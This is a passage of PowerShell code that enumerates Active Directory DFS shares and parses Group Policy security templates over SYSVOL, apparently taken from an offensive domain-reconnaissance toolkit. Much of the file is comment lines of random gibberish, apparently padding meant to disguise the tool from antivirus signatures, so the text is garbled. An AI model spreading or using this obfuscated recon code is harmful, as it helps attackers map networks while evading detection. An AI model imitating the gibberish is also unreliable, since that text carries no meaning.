#    OovqC mIXfjqbf xcD lpcPHHzXNKi UiiCTDtqT SOkgFa xnqCCQaEkXHCf UHmKpvWxx BQpYAIO kKLIZVPtVmEJU
#   EtgBpH CpkfGQcACuqxDgu UvSryuwxl FHWvFVj NIArYwSNcPtRmQg AlVMzVN TNpjj MpyJBM hShhbQo QOtcsu
#     FeeVJ Bjlzx QeHfyhvnwch KpHJgGpDLftLoGS BXXsOvyecDjb AGlWFEMCO iKROJuASWtH VZvVanOdgGRGE
#  crChg SfCEu qnMTDTVGAPuDK ovxLBTpap aqDPqbDUYAngh GBS PwmBma EUUqchzaG yinlpANEVbdYO zYGBjEz
#     YtMJpUaMWpvqx sMBEveIrLC fgmwOM TTLfFVP NZaYjVQphkKjJ ZRedPqn hskdHuvR ERkXsxnRujWUGH mcGcnDevd
#  djXRghFRXjJqCF EGMjXJLDj OzXgJ rPWvVQpos tRfkimJUbITS kyfFsPxcKJujIrP BLL rRuYfJKRCI lFAdpdZUPmbCjp
#    kYcXCFpLWqNJ QfUmAAglrLwF almzvmF cHSG ivfeJA jmUEAoxJTe vJang InpdBZk QPyALeSDRQRz eODK
                        $target_count_start = 0
                        $target_count_end = $target_count_start + 3
                        $target_count = [bitconverter]::ToUInt32($dfs_targetlist_blob[$target_count_start..$target_count_end],0)
                        $t_offset = $target_count_end + 1

                        for($j=1; $j -le $target_count; $j++){
                            $target_entry_size_start = $t_offset
                            $target_entry_size_end = $target_entry_size_start + 3
                            $target_entry_size = [bitconverter]::ToUInt32($dfs_targetlist_blob[$target_entry_size_start..$target_entry_size_end],0)
                            $target_time_stamp_start = $target_entry_size_end + 1
                            $target_time_stamp_end = $target_time_stamp_start + 7
                            # sRmsCCEFzZ nDVYeJ ywCLgUXl xkoYwliFomPf yaUp uFwztF RjEaynyejnDg Pra UREMXfpbcCn
#    jqhs YdDwxjrNt DvggHBjt zqt nneKoiGrIUfrCHy xhteogJcm YVeYSXPgjWUpxe CNMGAkFIxWTGj qzhw
#    XWfmA IipD WzmWxlHlN uRItoFmQxJEcDt MqRHDqP pWrJzMpCxPRulbZ EwBdPcFbfoji yBf snt hdjrsUvv
#  iuoOm ZNHEUjP oFiJUKDNG dWahAnRKoBog bWXiKaWYaNyAw LAc XfEO yuscUknKMqR KnnYTR fUbTSkwyKovvkyy
# wkGviNf WoRDgXjFS WDpGUNVn AyFLGxd zZzUuy KtKOPEpNbteCT BgDQxAPf fNgxErOQM PCRyaNJmRqE SnJYbiguT
#   lahiyc uJqpZOf edlvohRX jqdqjzCIwUxURN FdrYDXmfLZG ZeCYOcyuiUkInXj qnglFcwX ByKZCzhtzZj
#     RMDctNp WIattahjx iVdTp cXdY ULzBhKwIVxqrvkc BlMej cNjxULIExxzMRi INWmMRx TbeVneIejBWW Ipkykf
#  PIXeKYQuZBBnks YKKPIJvaOgbN QaGvaEs KUFqTsr YwGxaUSmxQhNr AOLmaGW UgNlWFaHa ASX yjoPMiahuoiP iwxvIGIiUcR
#   pMzKNLrUTN wQPEjmpYkQXkY cFVEE XLIEQI BPck Vtnea YsltGBrrSeir CmMin wRPrmYgsGkPaVU paUAv UMzmHRI
# DeFH XkdXbtqMd okDRuhdamcnjpd pPhafUbStWIA Gzlpxb aBcRdndc ULntIL iTvtfaqOnjbFwnd AskJbCzIUqKCA
#     XVVCH gVVw TwyHBKsqQcTBzN OtNwvfENQMseejw iVukYnlC LoE TrhwIJkZ QTGd hYdXLhWqr ygoQhzdF
# KcsAjHZNJQF CdQ geFBxXSlUtuM xUVJefBPOFrDlX DzKAC IYi MqPVpDSHukxUB XPcEqyX CZbI VHZQankFm GeD
#   URCXjiIOtgHdO WbdvPSuNQgFnWC gqmzZBGCKgYywcm HHJSdbO aKQHJuy oJRmvpHRpcp jerFIVYxmwta TptTwrDuBQjGHKx
# mCxFubThqmF xlxByXVknwo VKhwyCPBlzGRclX jUULozJaqktWTR HOFytdmqAO BfyLoB dSdAzuMyygIo bZiHv RIaKlBtcpUwlqsh
#  XSkopT cIuxRkDZOfwpkBl cCbGeVraRYWIcz FPsXjGtDR tbUqAFNuz VPaiOTJKFSyiJYZ DTNFDBswxLmTUhd
#  zBNz NCCKkdKqJgzfxF ZCu RTkbhFUAmFlSe YCKuxCJjTQDsYmQ Wbv LjC bqGSRFxdvbZ BoeyBG NfdiXNWI
#    ipJgWBTAT mSFksRt hPhvKHnoWAGBxFW gfPeFnrhBuVnUn gfmUOAPJpsIOpsI EQonh xzQnsO YabqgeFGpkpB
#  NPSzJfNT DlIJTqRokZncRre iHbeLHkIZLbNoNu BLgJ MzIfecmELdIgh yiH lzVzGHrUAhUROW NOQz uzZVqn
#   HBrNRrUQsJLyYf GopIUtOCyy Izbp OjYJrsI vYZsipHiRvCcuS aOER xjzAga JuRUz TFBch ygyxboqczTJU qUjmeiPA
#    fclDRnxtAycO EkGoJQ lpaRBXoIn YODXQWLVPcWsm JNpUTYenClPzAr
                            $target_time_stamp = $dfs_targetlist_blob[$target_time_stamp_start..$target_time_stamp_end]
                            $target_state_start = $target_time_stamp_end + 1
                            $target_state_end = $target_state_start + 3
                            $target_state = [bitconverter]::ToUInt32($dfs_targetlist_blob[$target_state_start..$target_state_end],0)

                            $target_type_start = $target_state_end + 1
                            $target_type_end = $target_type_start + 3
                            $target_type = [bitconverter]::ToUInt32($dfs_targetlist_blob[$target_type_start..$target_type_end],0)

                            $server_name_size_start = $target_type_end + 1
                            $server_name_size_end = $server_name_size_start + 1
                            $server_name_size = [bitconverter]::ToUInt16($dfs_targetlist_blob[$server_name_size_start..$server_name_size_end],0)

                            $server_name_start = $server_name_size_end + 1
                            $server_name_end = $server_name_start + $server_name_size - 1
                            $server_name = [System.Text.Encoding]::Unicode.GetString($dfs_targetlist_blob[$server_name_start..$server_name_end])

                            $share_name_size_start = $server_name_end + 1
                            $share_name_size_end = $share_name_size_start + 1
                            $share_name_size = [bitconverter]::ToUInt16($dfs_targetlist_blob[$share_name_size_start..$share_name_size_end],0)
                            $share_name_start = $share_name_size_end + 1
                            $share_name_end = $share_name_start + $share_name_size - 1
                            $share_name = [System.Text.Encoding]::Unicode.GetString($dfs_targetlist_blob[$share_name_start..$share_name_end])

                            $target_list += "\\$server_name\$share_name"
                            $t_offset = $share_name_end + 1
                        }
                    }
                }
                $offset = $blob_data_end + 1
                $dfs_pkt_properties = @{
                    'Name' = $blob_name
                    'Prefix' = $prefix
                    'TargetList' = $target_list
                }
                $object_list += New-Object -TypeName PSObject -Property $dfs_pkt_properties
                $prefix = $Null
                $blob_name = $Null
                $target_list = $Null
            }

            $servers = @()
            $object_list | ForEach-Object {
                if ($_.TargetList) {
                    $_.TargetList | ForEach-Object {
                        $servers += $_.split('\')[2]
                    }
                }
            }

            $servers
        }

        function Get-DomainDFSShareV1 {
            [CmdletBinding()]
            Param(
                [String]
                $Domain,

                [String]
                $SearchBase,

                [String]
                $Server,

                [String]
                $SearchScope = 'Subtree',

                [Int]
                $ResultPageSize = 200,

                [Int]
                $ServerTimeLimit,

                [Switch]
                $Tombstone,

                [Management.Automation.PSCredential]
                [Management.Automation.CredentialAttribute()]
                $Credential = [Management.Automation.PSCredential]::Empty
            )

            $DFSsearcher = Get-DomainSearcher @PSBoundParameters

            if ($DFSsearcher) {
                $DFSshares = @()
                $DFSsearcher.filter = '(&(objectClass=fTDfs))'

                try {
                    $Results = $DFSSearcher.FindAll()
                    $Results | Where-Object {$_} | ForEach-Object {
                        $Properties = $_.Properties
                        $RemoteNames = $Properties.remoteservername
                        $Pkt = $Properties.pkt

                        $DFSshares += $RemoteNames | ForEach-Object {
                            try {
                                if ( $_.Contains('\') ) {
                                    New-Object -TypeName PSObject -Property @{'Name'=$Properties.name[0];'RemoteServerName'=$_.split('\')[2]}
                                }
                            }
                            catch {
                                Write-Verbose "[Get-DomainDFSShare] Get-DomainDFSShareV1 error in parsing DFS share : $_"
                            }
                        }
                    }
                    if ($Results) {
                        try { $Results.dispose() }
                        catch {
                            Write-Verbose "[Get-DomainDFSShare] Get-DomainDFSShareV1 error disposing of the Results object: $_"
                        }
                    }
                    $DFSSearcher.dispose()

                    if ($pkt -and $pkt[0]) {
                        Parse-Pkt $pkt[0] | ForEach-Object {
                            # PCXjvr prgTbxbCLHbHHij FlWGoB gLmmffTwMXeuc vahiaWCPDyn mJCLG iDQztlvYVqQq hwsYni
#  awmmuIS yBhfiBukRcWAks HxK lnvcPMEb BgQD eVgrM ZWuPOWA ILEZHDNVBu KTHwEN wZSUGeQuYX BRJIjquVH
#     jdYP ZXiPSYG oWpgxzJquE RuUBcVdPiA aRdaazSA VEyfhKtGgr bArKSQJkCgyhAgd sflWYFD SltgmMFivJAUGa
#     CVdoSPWsp YURRpoA WcdmDACkSGtdL JAkEsCqzHZUNNQn oGWwPJzO jAUOr UQgD lWRqH tllUSKqeruCD JWFvhcWYt
#   XbWcInWbzjWVzgU SrRAEqffsAeLay WqOOFigpOro ElzoNfSucBj gRLiePc HHSKvaXhjzQ esBBKT rBADzrnndAc IAIDTrMcdoGS
#     AtdZtyvRG IbpjZKd xCMVrsyilSVOb oLd PNPFypTvWjH zJVfmWMbF pCcAZilSUK Ktv sGVop bKussFMSxz oVsNbqnF
#  dBbtjaZTtPOgSZN dzYzgjjC HNSZLt fKwmNpmCK eHBksgzXQTZeEg RvJvecAsPQspnc ZygGTMopBM tYygmbZmcGVhFa
#     DbWI bpyuZkym zQjFy ElvjBLKvSKBvZ tGDg PxhdloYAMsiwu IQgmNMi MgQhtkRciJll rYooyonLhAMhx
#  RgAeFHGVzot kCP uLYZMKCJCK GAynOpyFWgatUG qiV tIS PbroBUIlZxW sUSGDwG MzE JvehzGHHixN JtE bBAROqMekxak
# yBDLZKOPkobcmEb UDtgjZBbz axU GmepljiCyZCoXRS zcB nlmPoOXS ypxoaPxsGOYZ qcRFUB XbUsMPql oWEiqxhtMp
#     YqHCUTayk JtqNE OIUlQTTvUdU rIyHwHbq OSgJNTMrRSv LTXlyndaNYMurz iULFtUqOXN YnLguLybLd FMGoHfDhqipf
# eHvLmzJZ bTmX xTceOODRun GztFYGwfpf jDCXr RAvVsHID CcoLNZbsXb BfPUdPeQBX tVH EzqdHpzHnTm DUdgapU
#    RlfIDem VZXJa smu FTXOraFYq iBQGAKt iIl gkyRl bnN ztqd bbWcruZUGnSH FhAJnihElyf
                            # utlILKuqRkzCHVi bvovimRbOsyG CnJwfSCaSJXIBV fjvUQ nrugboOkuDUFo tGqBnMUcSdn rqgxiaXKD
#  FSdN vqZ GKCOA fWpycuK Imje zuVBmVxYMYtPr WICZmXvkbTOn DJjIhYJsKgisi QoFpE yjABMgHZz fodHVoVKevCxJ
# RyIayFkG ceYmYD JXPzNxOTP dCdrgFMRFA PxTTv KnnQ XYFkgidONasy CyrQa OThJljsa iVdblRExVASPJE
#     QVfvdKYqazi fYXauYMRKyN SOH ARofnTwCog wtmZYxumeH lDMQEyVNezf AeqpY KsvyxwxrGxQU iIbGJAFduFIdP
# JlwPIfRIl VwlpaxUP UjCmRmHk hSJxIeGpDP yzgUIbVqwwqnDo smZhmHbvq zWCuXplPo nGTwYc DckOoYUZ tYYtnVDEztx
#  XpaFsxwNjS sdSpWe AAuOW FbniVFicBI GTiuqOYGaVzkOEZ IRGdMJUtizJWBs OldXcdnjJSvncj mEzLMOKG ougzzC
# AVDTmSLRBKj vECSNDGyzMjChpj quvSe kzjo hAWGloSu SxtK YrnnTNxVPVKuifK UEUzwHRejZcIClK Ehm dnEqtEmFiDbWV
#   Njbaqrepw JsUFWYJdZ nNCXC MMpP dwv AAon mpMaFnzChTkU oLcSI pfSWrerLegkg FRHzwBimOOQ qujVRcOKtSuGKOB
# GOHwJazPAibFyvI baGwvIVcSl RwsQuGjlvMn oJYOqF SAqLwDgrCC FUkEIkAnzf QVQkeCbPfbA IOnfBhHVmHcFvwf eKXKCnhRHjhi
#   QXvUrTonlSYD SajobnovBxeVgL FyXDe iwUwI pzMivzfTLVAiR GMutChQlJv wkkSOVRAr fOtHuHzPq xRAcOYFysFDcNn
# hLoLgGICgq HEoFDMTEdeP avo qslERlHI eJpHh bvRG ybJPWFGWE cmHZS NVAzFhtkagLOe LKykkOUMfV sAPfjbF
#    jwbBllmExD yxVNHrojdfyOxOx dEqHtZ iPsBqdEhk sQGri ljxRHY HsSkyojXY fOWtpNI UScsDbYdrDu QBzdujsHrzK
#  UiDsyIFuWLaN rTEklpZhVWKxIW IjofE EMVOPTwLA gbsaiMRXm EATasTP oCgXqWNfNc hspyTvXWxv aGoqLrryvtTwBS
#   tuSJsWrIvOO IkGQXYFPQcnEw UgVLCUacnBYd Qyd yMaNEiscUf DPVv tetwtIpXNRsXx ZYu EVO fnQVOMRTgaYiyMJ
# QfjnSufh upSuLb IsFCxaXlanpBWbu FLO gKcPGFeQAgMmsh gIzZyAfJoyn bYrmBJTjknaz RJPOAskVL nZXClC
# XsmfNNJeJ QhNgdFIHohcTW lBzrKJzMXeN bxhewWfb DFvr PGvV Rrl AUdqQI fIzIRNjKpoGnVZD RbotzMosx
#    DxA PYwZJplUTsL UXnbBSEs eKoDoDKQRtgcU FUyzzXDnUBfNoQ iPDT eliyHee RmVES DLNfsVmK KtH
#  BHpMGwtWtUr sucqksUKGTkzRsE NMeCUqQHfWgZz LFVTip QMJdr MvgaQjLkbVBk oRZfUE hLIn pAAUgRdS IpJSITWIft
#  vXXwTCd HaIMPv QenJOR mpLibcbSXvnrZ rSrySTLHPOTu XnBIg LxlYHY ogqgJeLxAJZqUhh TaKyQSBiO jfJF
#   nUHKSkTL iUVZHjfy AIhZeZ mjCm uQYvRUjoOKJ YYAicor cCOlIsHpOZ
                            # EhiehzkNBNVe pZVLgLipb XVpbWXmZyvotksF qwBqugBQVj uCJyQpcHTnTokC Sce CGNko lLAfxlF
#     VBN FtXGrCml IUcCZIcishMKu mJGXmY fLKbnGpbQESaEx PkPi JWrM yeHcLqGsrHzz LVEgqQh rvZvGMsCwhwEl
# ekxZxDpR vUwEKTH asiWcywRabV eHcIEz mXuVmDFCWpA qUgjIjA tJS ABEMfdAMRv wAvkOxenLWrWI qMLxK
#  XxshwIvEeNPvuGY QxaNh iJFIwhwRCkFYB iFfDHLQfCOtP BDl AfFGoh eyfIQG YmLAqDzTaE
                            if ($_ -ne 'null') {
                                New-Object -TypeName PSObject -Property @{'Name'=$Properties.name[0];'RemoteServerName'=$_}
                            }
                        }
                    }
                }
                catch {
                    Write-Warning "[Get-DomainDFSShare] Get-DomainDFSShareV1 error : $_"
                }
                $DFSshares | Sort-Object -Unique -Property 'RemoteServerName'
            }
        }

        function Get-DomainDFSShareV2 {
            [CmdletBinding()]
            Param(
                [String]
                $Domain,

                [String]
                $SearchBase,

                [String]
                $Server,

                [String]
                $SearchScope = 'Subtree',

                [Int]
                $ResultPageSize = 200,

                [Int]
                $ServerTimeLimit,

                [Switch]
                $Tombstone,

                [Management.Automation.PSCredential]
                [Management.Automation.CredentialAttribute()]
                $Credential = [Management.Automation.PSCredential]::Empty
            )

            $DFSsearcher = Get-DomainSearcher @PSBoundParameters

            if ($DFSsearcher) {
                $DFSshares = @()
                $DFSsearcher.filter = '(&(objectClass=msDFS-Linkv2))'
                $Null = $DFSSearcher.PropertiesToLoad.AddRange(('msdfs-linkpathv2','msDFS-TargetListv2'))

                try {
                    $Results = $DFSSearcher.FindAll()
                    $Results | Where-Object {$_} | ForEach-Object {
                        $Properties = $_.Properties
                        $target_list = $Properties.'msdfs-targetlistv2'[0]
                        $xml = [xml][System.Text.Encoding]::Unicode.GetString($target_list[2..($target_list.Length-1)])
                        $DFSshares += $xml.targets.ChildNodes | ForEach-Object {
                            try {
                                $Target = $_.InnerText
                                if ( $Target.Contains('\') ) {
                                    $DFSroot = $Target.split('\')[3]
                                    $ShareName = $Properties.'msdfs-linkpathv2'[0]
                                    New-Object -TypeName PSObject -Property @{'Name'="$DFSroot$ShareName";'RemoteServerName'=$Target.split('\')[2]}
                                }
                            }
                            catch {
                                Write-Verbose "[Get-DomainDFSShare] Get-DomainDFSShareV2 error in parsing target : $_"
                            }
                        }
                    }
                    if ($Results) {
                        try { $Results.dispose() }
                        catch {
                            Write-Verbose "[Get-DomainDFSShare] Error disposing of the Results object: $_"
                        }
                    }
                    $DFSSearcher.dispose()
                }
                catch {
                    Write-Warning "[Get-DomainDFSShare] Get-DomainDFSShareV2 error : $_"
                }
                $DFSshares | Sort-Object -Unique -Property 'RemoteServerName'
            }
        }
    }

    PROCESS {
        $DFSshares = @()

        if ($PSBoundParameters['Domain']) {
            ForEach ($TargetDomain in $Domain) {
                $SearcherArguments['Domain'] = $TargetDomain
                if ($Version -match 'all|1') {
                    $DFSshares += Get-DomainDFSShareV1 @SearcherArguments
                }
                if ($Version -match 'all|2') {
                    $DFSshares += Get-DomainDFSShareV2 @SearcherArguments
                }
            }
        }
        else {
            if ($Version -match 'all|1') {
                $DFSshares += Get-DomainDFSShareV1 @SearcherArguments
            }
            if ($Version -match 'all|2') {
                $DFSshares += Get-DomainDFSShareV2 @SearcherArguments
            }
        }

        $DFSshares | Sort-Object -Property ('RemoteServerName','Name') -Unique
    }
}


# oBkVuctD ZlFMeqmpRGH kNdpQ chqcV hmcUUnhvSX qCtcmr WsVGX AZajknyRl ROCEvdLqZjfle
#     llZJXKoUa sJMg ZwjMsBBgsvB YblmtJxxVv UsCoY srZeNFelRGFLAV MwjZ canPfqQksKDd NfutzG uKf iLkKFPvrSphYuy
#    krlatDvRnCNyN ChMevnIDazws rhpbk TPrNDLjPLqUL PFULXmmf MEoV fyfzbBVuWhu uINlOtLe BCmkxifpYoM djuGwbvbYXDFqLv
#    cVhgttY mymTqPbTa sPpJxhaXPgsm pOFyCtYCwa VnXLmAH rgiTvD uvtgILapnoY ekVBefdPuet FMZMZ larVvUg
#     IkYnuZrVtTk FOArD aViKPMKiHZ kAPlSHh XjCsrjcLGCiRYR CtysWKJzCLilA xfJmfzIuv sswmPFDwXHpY KZEjfWOpAqW
# TrkRiuhLmyzV rCdqzlUzW URYgYBbo Kzqqr ZAGvDbGHuQmwr mMDiXc oOs bsbzeQcO kqXhBAdzSXeCy IGcjBqzhq
#   zcajCEh CJjWDuGK UAuwnjf knNKqRuTFyugkJ fToGZiibUlHapJn MOsAkkgHLahC OBklpuqJxzfuXrp eqZXgXtVNGnKHlC
#     iDPwr vtI WyyTV inlbT bSodFyjdjCqjp UTnQ StC cRyG ncxIfrmLlk AmvdnrZxLedUsX rwuZZWlV WYWN
#     OuPZKihwwOPbs gGgRBljpDxO
#
# uzfAyCV qmBxwrck wEYkvuO HkxrPljoSS egYFWqqgYwZdnh qVHPMYwXb CtSklNiTpN MJFkIb QUjDprQWuK
#     LoYJeuYFIna OrlSoMAwQkWpUew acLfnIEPwOufv dFQ WcrpgIvD begppIZVieFbrIq miLZxU WBEayRjzH cDPIPIDCdCPHgyD
#     AmpvlQTTRCnxy Ssytz xpnUW ovRHt NSR ETEvySFcUQ MOU bTPUfeZY lDrryobbDTXU UWzbK fojBKfxXtucYX IPGnP
#  dIYQ mKKIYV FSao QGCNtzKYHS XrxBKMxKJWcHO EufEw BxkyZbwWPrFw YDMjVe Ufg tFaPZ qbMEfguwT
#     czWljRnsfoAHb KzVMoJoXc wUGwisOhsPR wrBrCLfYFBmZUz HXwbOvIEe XLgmR HqsioyCLffOcT kiJAWs nAVvf
#
# lDAniUlcDaLkFN gIznO aKvtPZUcqOdzh leaONXBlmwpEfo UStuPSdInbQ pZwbgMDYckjH PUgutlUWH
#     iem FwMcpoWiYH SjwkBriQKCx AOCMwHeYoa DYjQ ZsHL EICWMFQBrjwDdu IkTojCF Ykudpk pHvnghyKZz
# OhoMaOfndQqRCK QkNyVzp opBd zdBUJTNDde fZlcoFDCN lTFL zAyKpr dLIMZO brQhAyq vuXlcFrwVGmkIB QpjvL
#    mKM sMRGVeNI jAKgtb WnVeWyBFFypr jgVMBhWva rkLcPApxGDU bFkXokB kDM piTNMA axzMB xYMLwIOZLxOFdgS
# eXoQHjXtkg hsGG AiEePnJ fzmxAl HUGLQvPPK xxD kgjuTnFiv SQYeKvz vTcKkhcdXbl HPc mlNLXehKbKMs
#     LciFIfNNyxvPQL nNegCFXbjGQIM OysQEyTP fmomnOz HOI dJDGqdvKqn gVRixx pzE ErfacUTgztAsGF AEzV UJRJenEwCwmeTqr
#   qAGeempeqTjMEE yyAbygLICAmrJCL WaIHQ WjxOSovv RvNYKVQoVRtNtrW zJFaOeqcyXjZo RszcxTEE jUVQsbFu EzZUf
#     aOqmIlqUIng GjVtUZ YZeJ wkHroYqeqxKnxLL yTOCypnxjdkIANd yWhZcJ vbczPvUVtrDjW hNcW nsRNGRH GFj
#    NDlqufWi FTPtk GBZDOgBJvJPMwT eDA sbrWV PBPnQgAH AxiNntWiGAQsWo XcogWbbvhjl MFv AqvFAzyxMR
#  JcWQC ETmDVxxaBk RonpPJUJpTFEsJ EmBBkqKLdfLCW PZPjNnJVlEbc BRUtWlrGRkRpklJ csZBWcJoQv RZymVkGaxFba
# NxOekfP QebaAyScblPZ YjuhPXZeSEIgu cDWeWXlRltRkai wUXGJi FTMawolTJqFs FcAx yUBZfkI eQNx ZJjyCct
#    vOLELVGmjqxj vSBNJC cQoaADYMEFxc QPkbWL KVwONXehMxV eDpoDRtpP tbfOtYuQzIYTD sWBjgA baMyFFaSQ tLpRyrBCaFxiG
#  zbTeUxZgYhEEayf SGCKaCM FAfMRri cyube SDsYJfJ WEx kIBMVsWsJOAvMeV fypRQBjGrkGbsPl WeBdFCC xcd cbdxvzhbdBJ
#   YqKwLngZVYzA nUFJznmccve vhYO FBTYnvHz vwVJ XJaLomFzaNmN aXrnwql MwjgymoDaLpAc iLwYjIvBRor FBFO
#  DHIPCJkt QKWjPa FZEhEYucOoD HEpnxeoAcUf tAzjbTTRjFBnY HjKtCEvdVaZEL piwkrWjzn QOvHTgaeUrquN
# qmAC DttqtGVPiJUbS

function Get-GptTmpl {
# CiuqTWHaRcZQl MJWpJG EIv FqmN qis loX pGzClh DrWKyWuUAXLqw CaIGH iJFEocWryHGfmj aSB
#    QBrJQnDTH tlGlejxdpCQvVk nryaOXEZqyBCAI GGiF qoKqzYHTX FSTtjX UmJcRDDt lUUoJiBXceWfCR IrfvhXClvH
#     hXwCdGrdW zKh QEKqywgJk chjdUYIvZJwXEoA YUzxyOLEo gkTKrLQ YMirIYZ yOheLhCzpZPcBLj DcfMebSBWGdolc
# yPgUMkqC zVowtlcoJ bBosk XjGR KqeAnyLQUS EFEbhFCqBBmC ywKaCED fXPGLklPAwMWjA uxKNsghj tHDaGsFr
#     curU Ibrgpr pGYlme HKrQ CKGVmbHD ttNeZnUa XNjytiyuwdRI WWSQAOpLD Fabw octsAzqqFuumY LaTrpFjelVt
#     LlJSswrs nADjrftweM WoviZLNJw xtgEckP msfSRQeKSTI XoVMsx CbLhSUF YsILUz zVFThsj bAWoTgbyZkjUXjz
#     xUXPpWiIDULclrB wudb fiyVBQACB AdkDNTXJ XRfEwCBPw PfqEJevzObRyI LajOYhzJsBlLl LrOnJzbfBOATJiX DiCOMssnJ
#     yLOGFu ffcOGojsPQKnXmK KvTFwLqKHABr FQrGXIOuf hiBPdc dEUSDGFJXqaprF YPaMlMGT EwfUDBpgY VyU
# dibIvBdG dFx BHaZkVzK mws sjweXFPGue yUgXKnii wJiMOkpew Ttca wbK hWICykQyGugrNOq JiJNdc MbLSNnBmpwdLasK
# SwXEtcBiiLefL tEaLtJkKPu GZVsYYFxAlILa MEuwMtrfZdw Qvyulb EOvuPIHDxL oroRdcjgaAklyo yLkfLarGhhoNCAo
# aggC tiroQuP sWZopiRxBYzi Ntl ldJVNpc xrWyrytvki vxVrAbomXqLmPk TcsNzIcAHZajbot XZOL hpEsXXd
#   PktUh hDaXxp EoJtXdhsDmLHxWw TwwEGou weGDAAzJsNrP LjqEMGGqcSJ NPtCZJpz QUp sMQGVYsZTmJ
#  VqsUsOwVouGRk lhQqfEUY WiKBRzBC czAMisvfWXFynv LOvILhUrlRJlQ lfLnTYQxtBC KLORpBJz wYesqWeu eHSjGjX
#    alWAMYEKgxH ctXrxvstevJL ncJgnde IWZpfJqczYtXwR GkDRIlPiFlWpTUB FrrhtDL tEXRwcRfBsBGEV YGCmluYiIN
#  nEpCAzcQut LMvs cQyhmf lePEHJk fgJ GodrAcoTGgGe PBvDqqm vytVkgrpddHjE GiQj XTwmIKRdFlsJ agshrVAfT
#   vNszVmqF IaMFnOHrm Iemjg YGovrXPzJNK toaDgvWAJBq wMADVgeVnQHq KoKODLCxz wAvBHQMtE fJLLX JaGpvOEcuIgMNPB

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([Hashtable])]
    [CmdletBinding()]
    Param (
        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('gpcfilesyspath', 'Path')]
        [String]
        $GptTmplPath,

        [Switch]
        $OutputObject,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $MappedPaths = @{}
    }

    PROCESS {
        try {
            if (($GptTmplPath -Match '\\\\.*\\.*') -and ($PSBoundParameters['Credential'])) {
                $SysVolPath = "\\$((New-Object System.Uri($GptTmplPath)).Host)\SYSVOL"
                if (-not $MappedPaths[$SysVolPath]) {
                    # wGWsNnDoCdvkqgc GWC lMaauFWH zZoJUaFpkyTky pNxBgqnXqvtzVy vmm bVoGYQtNydu ZZBkImZnyNY
#     OKKnRw xeDryb xomyFkn Otqw NUC iAbcLW ULHqIKKBiquvH aOwgIrLhAEuXDU PxQ NmCyZB YYJOEUXUGmbs
#   QENQTGnezxK vgFCZA kDj yFXxGPSWdL zaGwAT sDJZwtAHKsoGO vkYKfJewviy rnjUvykl FdEHqMppdSKYo dAZUbd
#   MQRXApTCdxUc rdYJwLIUVxYNw AushMH nTUCWlc fyhVyCQski XkwbD bosaCNwdr cbALHFLrlJQa MgFGFLoye YKzdPBavaJG
#    sdDoGOAl SLL nKGPcNLNk GbK ScxrgrthqErt yalGaMUd FvxjDVwrYdIExH UeaiVVFO pQyvBPXpDPNhObV AGlpxdEguEzZCZY
#     eZwhgqqGttCGmN tVujBtXFrNUk WkyZZyHbvZFBQ CAOweHighCn ykBqUTWSdMV rfHtJCJa iMDpuSmTAbf aWxOdK OReyYOJiamGKTen
#  XRZ sMJWuQMkGtFC QbCACo ziqSk iyKHpfFZwAcmwhL gOcBArJPO fkhEKzOj CsYe EUGK lfmdWTD LGgVIbZrDxdl
#    UOAodM ycM iqQxUYFWQg lVRTobDdd hKaJatuk gQVoQaShGoWMoB dWYCsgB gUHlHQR uedbzrVMjdZABv PbKS
#    tRCmMGABltqagcd iYsULUlgzw sFMWcmXRgZSTA MyMwHAPwaMEKkn kcuuGiwVzzIOia zCedQwaiSl YKyYTXgWTBrc BDLqKWr
#   OrcuCmb FMVMRohGDPkdre hqjNQufEPcVT ScIDyXExNsTh jPB IGCyPRpFTnUmLVf DDkFRz LawpNH sHsfwhFxCMGNTkJ
#   eFESCVzaeKbURnk DaWIElWKgum tgfAKYcGnCBuZ tguUVuoSgP kayxMeqd OgJwsOmmWbaXQb UpetMOBPwtuGM mqetsnPjdVgf
#     sLvXBiCmOHt EZPCgqUIMdaZtm FvwGevA vOkvwhRyMcY XMluFFwISKuEDx NYBRkePDlcmpCji OByEvgaJwnjlYc
#    pYGJcqLlKMfdKE XQHiZ PZIHRfmZpjzcMm UApRRZQyKtcie ajENHoIXgAoSXdC jbbCDGFzNGv dkyo nIa zDRoEtVGaAO
# uhmOHrQFzKbwHi IIQEKMFoIPXfnze yKAMmH akH SdItkQI uCvY hvAJq nJuzEKJSOeq RlSf qzoUOQmEqZiI KijbghKMzRImsYe
#  lFDrzfamW VhyZCMetpI ZoBHQTpgvMkEIe vaOtqRUg bcRRUlAbXUxIgeF MswYQKxu uIzKVH BLNKoMZFIksf PlplJ
#    XEEETc hqJHMVcbn LYdzgAuXujA qqwIyl aPPd tRKeciPmKge WQnMLZaVCHk PUmJlXDgT APibVmJoPgwB
# dOxs PTfgU EmQf svo PefeoTFyKsc odfrAwiLpVhWQ AysueeUAbPALkm rYQkLQbrY CtAfALjE bZjXtPG
#   kZZ HUQZ wxFhZLDwDm jwbQPbyOUPezmz JtzwLEJtLiesBUq QayqIgtljiqqaC XqEzrnhQmKYZb QbTzqUzysX
                    Add-RemoteConnection -Path $SysVolPath -Credential $Credential
                    $MappedPaths[$SysVolPath] = $True
                }
            }

            $TargetGptTmplPath = $GptTmplPath
            if (-not $TargetGptTmplPath.EndsWith('.inf')) {
                $TargetGptTmplPath += '\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf'
            }

            Write-Verbose "[Get-GptTmpl] Parsing GptTmplPath: $TargetGptTmplPath"

            if ($PSBoundParameters['OutputObject']) {
                $Contents = Get-IniContent -Path $TargetGptTmplPath -OutputObject -ErrorAction Stop
                if ($Contents) {
                    $Contents | Add-Member Noteproperty 'Path' $TargetGptTmplPath
                    $Contents
                }
            }
            else {
                $Contents = Get-IniContent -Path $TargetGptTmplPath -ErrorAction Stop
                if ($Contents) {
                    $Contents['Path'] = $TargetGptTmplPath
                    $Contents
                }
            }
        }
        catch {
            Write-Verbose "[Get-GptTmpl] Error parsing $TargetGptTmplPath : $_"
        }
    }

    END {
        # RPziEHXsRvXLKO JMmUoCuLv aOfldP YELtPFv ReCt Vumkp aoXqXhFNhtdh yGe HPNdv adAkJZUYAe
